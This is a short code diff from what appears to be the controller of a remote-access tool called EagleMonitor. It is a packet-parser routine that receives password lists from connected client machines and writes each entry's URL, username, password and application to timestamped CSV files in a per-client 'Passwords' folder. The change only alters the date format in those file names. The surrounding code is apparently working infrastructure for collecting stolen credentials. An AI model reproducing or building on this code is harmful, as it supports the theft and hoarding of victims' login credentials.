@@ -50,17 +50,17 @@ namespace EagleMonitor.PacketParser
                                 row.Cells["Column3"].Value = str[2].ToString();
                                 row.Cells["Column4"].Value = str[3].ToString();
                             }
-                            Miscellaneous.ToCSV(clientHandler.passwordsForm.dataGridView1, clientHandler.clientPath + "\\Passwords\\" + DateTime.Now.ToString().Replace(":", "") + ".csv");
+                            Miscellaneous.ToCSV(clientHandler.passwordsForm.dataGridView1, clientHandler.clientPath + "\\Passwords\\" + Utils.Miscellaneous.DateFormater() + ".csv");
                             clientHandler.passwordsForm.loadingCircle1.Visible = false;
                             clientHandler.passwordsForm.loadingCircle1.Active = false;
                             passwordsPacket = null;
                         }));
                     }
                     else
-                    { Miscellaneous.ToCSV(passwordsPacket.passwordsList, clientHandler.clientPath + "\\Passwords\\" + DateTime.Now.ToString().Replace(":", "") + ".csv", new string[] { "URL", "Username", "Password", "Application" }); }
+                    { Miscellaneous.ToCSV(passwordsPacket.passwordsList, clientHandler.clientPath + "\\Passwords\\" + Utils.Miscellaneous.DateFormater() + ".csv", new string[] { "URL", "Username", "Password", "Application" }); }
                     return;
                 }
-                catch { Miscellaneous.ToCSV(passwordsPacket.passwordsList, clientHandler.clientPath + "\\Passwords\\" + DateTime.Now.ToString().Replace(":", "") + ".csv", new string[] { "URL", "Username", "Password", "Application" }); }
+                catch { Miscellaneous.ToCSV(passwordsPacket.passwordsList, clientHandler.clientPath + "\\Passwords\\" + Utils.Miscellaneous.DateFormater() + ".csv", new string[] { "URL", "Username", "Password", "Application" }); }
             }).Start();
         }
     }
